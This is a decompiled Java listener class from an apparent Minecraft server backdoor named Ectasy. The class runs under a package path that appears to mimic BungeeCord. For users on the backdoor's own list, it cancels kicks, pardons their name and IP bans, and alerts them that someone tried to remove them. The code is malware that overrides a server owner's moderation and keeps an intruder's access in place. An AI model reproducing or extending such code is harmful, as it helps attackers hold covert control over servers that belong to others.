package fr.body.ectasy.listeners;

import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.BanList.Type;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;

public class UserAntiKickListener implements Listener {
   @EventHandler
   public void onKick(PlayerKickEvent var1) {
      if (!Ectasy.killSwitch) {
         Player var2 = var1.getPlayer();
         if (Ectasy.users.containsKey(var2.getName())) {
            User var3 = Ectasy.users.get(var2.getName());
            if (var3.rank != Rank.UNAUTHORIZED && var3.antiBan) {
               var1.setCancelled(true);
               if (var2.isBanned()) {
                  Bukkit.getServer().getBanList(Type.NAME).pardon(var2.getName());
                  Bukkit.getServer().getBanList(Type.IP).pardon(var2.getAddress().getHostString());
               }

               ChatUtil.sendChat(var2, "Someone tried to kick/ban you.");
            }
         }
      }
   }
}
